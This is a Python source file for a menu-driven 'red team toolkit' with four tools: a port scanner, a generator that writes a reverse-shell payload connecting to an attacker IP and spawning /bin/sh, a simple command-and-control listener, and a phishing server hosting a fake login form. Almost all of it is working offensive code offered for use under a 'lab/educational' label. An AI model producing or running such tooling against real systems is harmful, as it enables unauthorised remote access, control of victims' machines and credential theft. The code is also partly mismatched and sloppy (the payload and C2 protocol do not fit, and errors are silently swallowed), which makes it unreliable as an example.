import os
import socket
import subprocess
import threading
import time
from http.server import HTTPServer, SimpleHTTPRequestHandler

# ---------------------------- Reconnaissance ---------------------------- #
def port_scan(target_ip, ports=[21, 22, 23, 80, 443, 445, 3389]):
    print(f"[+] Scanning ports on {target_ip}...")
    open_ports = []
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        try:
            s.connect((target_ip, port))
            print(f"[+] Port {port} is open")
            open_ports.append(port)
            s.close()
        except:
            pass
    return open_ports

# ---------------------------- Payload Generator ---------------------------- #
def generate_reverse_shell(attacker_ip, attacker_port, filename="payloads/reverse_shell.py"):
    os.makedirs("payloads", exist_ok=True)
    shell_code = f"""
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('{attacker_ip}', {attacker_port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])
"""
    with open(filename, "w") as f:
        f.write(shell_code)
    print(f"[+] Reverse shell payload saved to {filename}")

# ---------------------------- Simple C2 Server ---------------------------- #
def start_c2_server(bind_ip="0.0.0.0", bind_port=4444):
    print(f"[+] Starting C2 server on {bind_ip}:{bind_port}")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((bind_ip, bind_port))
    server.listen(1)
    client, addr = server.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")

    while True:
        cmd = input("Shell> ")
        if cmd.strip() == "exit":
            client.send(b"exit")
            break
        if cmd:
            client.send(cmd.encode())
            response = client.recv(4096).decode()
            print(response)

# ---------------------------- Phishing Server ---------------------------- #
def start_phishing_server(port=8080):
    os.makedirs("web", exist_ok=True)
    index_file = os.path.join("web", "index.html")
    if not os.path.exists(index_file):
        with open(index_file, "w") as f:
            f.write("""
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
<h2>Login</h2>
<form action="#" method="post">
  Username: <input type="text" name="user"><br>
  Password: <input type="password" name="pass"><br>
  <input type="submit" value="Login">
</form>
</body>
</html>
""")
    os.chdir("web")
    httpd = HTTPServer(("", port), SimpleHTTPRequestHandler)
    print(f"[+] Phishing server started on port {port}")
    httpd.serve_forever()

# ---------------------------- Main CLI ---------------------------- #
def main():
    print("""
    -------------------------
     RedTeamToolkit v1.0
     For lab/educational use
    -------------------------
    """)
    print("[1] Port Scan")
    print("[2] Generate Reverse Shell")
    print("[3] Start C2 Server")
    print("[4] Start Phishing Server")
    choice = input("Select option: ")

    if choice == "1":
        ip = input("Target IP: ")
        port_scan(ip)

    elif choice == "2":
        ip = input("Attacker IP: ")
        port = input("Attacker Port: ")
        generate_reverse_shell(ip, port)

    elif choice == "3":
        port = input("Listening Port (default 4444): ") or "4444"
        start_c2_server(bind_port=int(port))

    elif choice == "4":
        start_phishing_server()

    else:
        print("Invalid choice")

if __name__ == "__main__":
    main()
